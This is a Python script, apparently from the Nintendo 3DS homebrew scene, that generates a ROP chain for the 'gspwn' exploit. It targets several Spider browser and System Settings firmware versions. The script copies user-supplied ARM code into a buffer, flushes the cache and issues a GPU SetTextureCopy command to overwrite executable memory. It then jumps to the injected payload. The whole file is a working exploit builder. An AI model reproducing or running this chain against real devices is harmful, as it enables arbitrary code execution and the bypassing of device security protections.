# spider_gspwn

import sys

from p3ds.util import *
from p3ds.ROP import *
from p3ds.app import *

def main(argv):
	if(argv[0] == "MSET_4X"):
		app = Mset_4x()
		r = Mset_4x_ROP(app.rop_loc)
	elif(argv[0] == "MSET_4X_DG"):
		app = Mset_4x_DG()
		r = Mset_4x_ROP(app.rop_loc)
	elif(argv[0] == "MSET_6X"):
		app = Mset_6x()
		r = Mset_6x_ROP(app.rop_loc)
	elif(argv[0] == "SPIDER_4X"):
		app = Spider_4x()
		r = Spider_4x_ROP(app.rop_loc)
	elif(argv[0] == "SPIDER_5X"):
		app = Spider_5x()
		r = Spider_5x_ROP(app.rop_loc)
	elif(argv[0] == "SPIDER_9X"):
		app = Spider_9x()
		r = Spider_9x_ROP(app.rop_loc)
	else:
		print "Unrecognized target " + argv[0]
		sys.exit()

	arm_code = ""
	with open(argv[1], "rb") as fp:
		arm_code = fp.read()

	armCodeSize = len(arm_code)
	arm_code += struct.pack("<I", 0xDEADBEEF) * (16 - armCodeSize % 16)
	armCodeSize += (16 - armCodeSize % 16)

	r.call_lr(app.memcpy, [app.buffer, Ref("arm_code"), armCodeSize])

	r.call(app.GSPGPU_FlushDataCache + 4, [app.gsp_handle, 0xFFFF8001, app.buffer, armCodeSize], 3)

	r.call(app.nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue + 4, [app.nn__gxlow__CTR__detail__GetInterruptReceiver + 0x58, Ref("gxCommand")], app.nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_pops)
	r.pop_pc()
	r.pop_pc()
	r.pop_pc()

	r.call_lr(app.svcSleepThread, [0x3B9ACA00, 0x00000000])

	# Jump to payload
	r.i32(app.code_entry)

	# Data
	r.label("gxCommand")
	r.i32(0x00000004) # SetTextureCopy
	r.i32(app.buffer) # source
	r.i32(app.code_target) # destination
	r.i32(armCodeSize) # size
	r.i32(0x00000000) # dim in
	r.i32(0x00000000) # dim out
	r.i32(0x00000008) # flags
	r.i32(0x00000000) # unused

	r.label("arm_code")
	r.data(arm_code)

	rop = r.gen()

	with open(argv[2], "wb") as fl:
		fl.write(rop)

if __name__ == "__main__":
	main(sys.argv[1:])

